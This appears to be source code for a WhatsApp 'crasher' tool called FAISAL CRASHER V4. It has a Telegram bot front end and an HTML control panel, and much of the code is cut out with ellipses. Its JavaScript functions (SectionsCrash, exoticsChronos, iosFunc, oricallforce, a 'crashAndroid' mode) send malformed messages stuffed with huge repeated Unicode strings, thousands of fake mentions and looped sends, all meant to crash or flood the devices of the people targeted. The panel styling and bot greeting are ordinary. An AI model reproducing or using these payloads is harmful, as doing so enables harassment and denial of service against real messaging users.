...
bot.command("start", async (ctx) => {
  ...
  const ambilFoto = 'https://files.catbox.moe/j5k0yy.jpg';
  ...
  await ctx.replyWithPhoto(ambilFoto, {
    caption: `<blockquote><b>𝖨𝖭𝖣𝖨𝖢𝖳𝖨𝖵𝖤 𝖢𝖮𝖱𝖤</b></blockquote>\nWelcome, @${username}\n\n<blockquote><a href="https://t.me/AiiSigma">𝐒𝐢𝐗 ☊ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧</a></blockquote>`,
    parse_mode: 'HTML',
    ...Markup.inlineKeyboard([
      [
        Markup.button.url('ϟ', 'https://t.me/AiiSigma'),
        Markup.button.url('🍷', 'https://t.me/N3xithCore'),
      ]
    ])
  });
...
async function Call(target) {
  ...
  await sock.relayMessage(target, Msg, { messageId: "" });
}
async function invisibleSpam(sock, X) {
...
async function SectionsCrash(target) {
  const Node = [{
    attrs: { biz_bot: "1" }, 
    tag: "bot"
    },
...
async function exoticsPayment(sock, jid) {
  try {
    const msg = {
...
//=========( IOS )=========\\
async function exoticsIPV2(sock, jid) {
  try {
...
//=====( UI X NOTIF CRASH )=======\\
async function exoticsChronos(sock, jid, etc = true) {
      await sock.relayMessage(jid, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
...
async function Potzz(sock, X, etc = true) {
        ...
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              ...
              nativeFlowMessage: {},
              contextInfo: {
                mentionedX: ["13135550202@s.whatsapp.net", ...Array.from({
                  length: 2000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                forwardingScore: 1,
                isForwarded: true,
...
async function exoticsMagma(sock, jid) {
  try {
  let bool = true;
  let SID = "5e03e0&mms3";
 ...
 let msgCrl = await generateWAMessageFromContact(jid, {
   viewOnceMessage: {
     message: {
 ...
 const msg = generateWAMessageFromContent(jid, msgAudio, {});
...
async function iosFunc(sock, target) {
    const trigger = "𑇂𑆵𑆴𑆿".repeat(60000);
    const name = "</> Kiillertzy";
    const amount = 150;

    const contacts = Array.from({ length: amount }, (_, i) => ({
            ...
            message: {
                extendedTextMessage: {
                    ...
                    contextInfo: {
                        stanzaId: target,
                        participant: target,
                        quotedMessage: { conversation: name + trigger },
                ...
                locationMessage: {
                    ...
                    jpegThumbnail: null,
                    name: name + trigger,
                    address: name + trigger,
                    url: `https://whatsapp-ios.${trigger}.com/${trigger}/${trigger}/`
                },
                nativeFlowMessage: {
                    buttons: [
...
async function oricallforce(target) {
  const texts = [
    ...
    "ꦾ".repeat(60000), 
    "ۢ۬ۤۢ".repeat(20000),
    "᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳".repeat(20000),
  ];
...
let jid = target;
    ...
    // Loop untuk payment
    for (let i = 0; i < 40; i++) {
        await exoticsChronos(sock, jid, true)
    }
  ...
  try {
    ...
    try {
      ...
      if (mode === "crashAndroid") {
        ...
        bugResult = await delaylow(sock, 0.5, targetJid);
...
<head>
    ...
    <!-- TEXT CHANGE TITLE -->
    <title>FAISAL CRASHER V4 - Execution</title>
    ...
    <style>
        /* --- VARIABLES --- */
        :root {
            /* WARNA BACKGROUND DIUBAH KE HITAM PEKAT dengan RED TINT */
            --bg-dark: #050505;       
            /* WARNA GRADIENT DIUBAH KE HITAM/RED */
            --bg-gradient: radial-gradient(circle at 50% 0%, #1a0505 0%, #000000 80%);
            
            /* WARNA UTAMA DIUBAH KE MERAH */
            --accent-pink: #ff3333;   
            --accent-purple: #800000; 
            
            /* WARNA STATUS DIUBAH KE HIJAU (Tetap Kontras) */
            --accent-green: #10b981;
        ...
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        ...
        header {
            ...
            align-items: center;
            padding: 20px 24px; 
            background: rgba(5, 5, 5, 0.95); /* Glass Hitam */
        ...
        .menu-btn:active {
            transform: scale(0.9);
            color: var(--accent-pink); /* Merah saat klik */
        }
        ...
        .brand-title {
            ...
            color: #fff;
            text-shadow: 0 0 10px rgba(255, 0, 0, 0.6); /* Glow Merah */
        }
        ...
        .user-card {
            ...
            height: 95px; 
            border-radius: 16px;
            border: 1px solid rgba(255, 0, 0, 0.2); /* Border Merah Transparan */
            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.1);
            /* Gradient Merah */
            background: linear-gradient(135deg, rgba(255, 0, 0, 0.15) 0%, rgba(100, 0, 0, 0.15) 100%);
            display: flex;
            align-items: center; 
            padding: 0 16px; 
        }
        ...
        .input-header {
            /* Gradient Merah */
            background: linear-gradient(90deg, rgba(255, 0, 0, 0.7), rgba(100, 0, 0, 0.7));
            padding: 10px 15px; 
        ...
        .dropdown-options {
            ...
            left: 0;
            width: 100%;
            background: rgba(10, 0, 0, 0.95); /* Merah sangat gelap */
            backdrop-filter: blur(10px);
        ...
        .dropdown-option:hover {
            /* Background Merah transparan saat hover */
        ...
        .sidebar-header {
            height: 180px;
            width: 100%;
            background-image: url('https://files.catbox.moe/tavzdp.png'); 
        ...
        .sidebar-header::after {
            ...
            position: absolute;
            inset: 0;
            /* Gradient Overlay Abu */
            background: linear-gradient(to top, #050505 15%, rgba(10, 10, 10, 0.6) 60%, transparent 100%);
            z-index: 1;
        }
        ...
        .detail-value { /* Teks Merah */ color: var(--accent-pink); font-weight: bold; }
        ...
        <ul class="sidebar-menu">
            ...
            <div class="sidebar-credits">
                ...
                <div class="credit-item">
                    <!-- TEXT CHANGE HANDLE -->
                    <span>@KapotidOfficial</span> - Dev Sigma
                </div>
                <div class="credit-item">
    ...
    <div class="container">
        <header>
            <div class="header-left">
                ...
                <!-- TEXT CHANGE HEADER BRAND -->
                <h1 class="brand-title">FAISAL CRASHER V4</h1>
            </div>
        </header>
        ...
        <main>
            <div class="user-card">
                <div class="user-card-content">
                    <div class="profile-photo">
                        <img src="https://files.catbox.moe/rv5aoi.png" alt="Profile">
                    </div>
            ...
            <!-- BANNER -->
            <div class="banner">
                <img src="https://files.catbox.moe/ytifar.png">
        ...
        <nav class="bottom-nav">
            ...
            <button class="nav-item" id="navAnime">
                <svg width="22" height="22" viewBox="0 -960 960 960" fill="currentColor">
                    ...
                    <path d="M380-320 l-25-60 -60-25 60-25 60 60 60 60 25 -60 25 -25 60 25 60Z"/>
                    <path d="M580-480 l-15-35 -35-15 35-15 35-15 35-15 35 15 -35 15 -15 35 15Z"/>
                </svg>
